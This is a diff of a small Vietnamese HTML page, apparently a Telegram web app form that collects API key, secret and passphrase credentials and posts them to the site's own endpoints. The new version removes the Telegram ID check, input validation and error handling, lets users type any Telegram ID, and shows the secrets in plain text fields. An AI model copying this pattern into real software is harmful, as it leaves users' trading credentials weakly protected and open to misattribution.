@@ -1,88 +1,47 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Telegram WebApp</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    body {
-      font-family: sans-serif;
-      padding: 20px;
-      background: orange;
-    }
-    input, button {
-      font-size: 18px;
-      padding: 10px;
-      margin-bottom: 10px;
-      width: 100%;
-      box-sizing: border-box;
-    }
-  </style>
+  <title>Nhập thông tin API</title>
 </head>
 <body>
+  <h1>Nhập thông tin</h1>
+  <form id="infoForm">
+    <input type="text" id="userId" placeholder="Telegram ID"><br>
+    <input type="text" id="apikey" placeholder="API Key"><br>
+    <input type="text" id="secret" placeholder="Secret"><br>
+    <input type="text" id="pass" placeholder="Passshare"><br>
+    <button type="submit">Gửi</button>
+  </form>
 
-<h2 id="status">Đang xử lý...</h2>
+  <script>
+    const form = document.getElementById('infoForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const userId = document.getElementById('userId').value;
+      const apikey = document.getElementById('apikey').value;
+      const secret = document.getElementById('secret').value;
+      const pass = document.getElementById('pass').value;
 
-<p>API KEY</p>
-<input type="text" id="apikeyInput" placeholder="APIKEY" />
-<p>SECRET</p>
-<input type="text" id="secretInput" placeholder="SECRET" />
-<p>PASSHARE</p>
-<input type="text" id="passInput" placeholder="PASSSHARE" />
-<button onclick="submitInfo()">Gửi</button>
-<div id="loading" style="display:none;">Đang gửi...</div>
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-  let userId = null;
-
-  async function init() {
-    const status = document.getElementById('status');
-    try {
-      const telegramUser = window.Telegram.WebApp.initDataUnsafe.user;
-      if (!telegramUser || !telegramUser.id) {
-        status.innerText = "Không lấy được Telegram ID.";
-        return;
-      }
-
-      userId = telegramUser.id;
-      status.innerText = "ID: " + userId;
-    } catch (err) {
-      console.error(err);
-      status.innerText = "Có lỗi xảy ra.";
-    }
-  }
-
-  async function submitInfo() {
-    const apikey = document.getElementById('apikeyInput').value.trim();
-    const secret = document.getElementById('secretInput').value.trim();
-    const pass = document.getElementById('passInput').value.trim();
-    const loading = document.getElementById('loading');
-
-    if (!userId) return alert("Không có userId Telegram.");
-    if (!apikey || !secret || !pass) return alert("Vui lòng nhập đầy đủ thông tin.");
-
-    loading.style.display = 'block';
-
-    try {
-      const res = await fetch('/api/submit', {
+      await fetch('/api/apikey', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId, apikey, secret, pass })
+        body: JSON.stringify({ userId, apikey })
       });
 
-      const data = await res.json();
-      alert("Đã gửi thành công!");
-    } catch (err) {
-      alert('Lỗi gửi dữ liệu!');
-      console.error(err);
-    } finally {
-      loading.style.display = 'none';
-    }
-  }
+      await fetch('/api/secret', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, secret })
+      });
 
-  init();
-</script>
+      await fetch('/api/pass', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, pass })
+      });
 
+      alert('Đã gửi thông tin!');
+    });
+  </script>
 </body>
 </html>
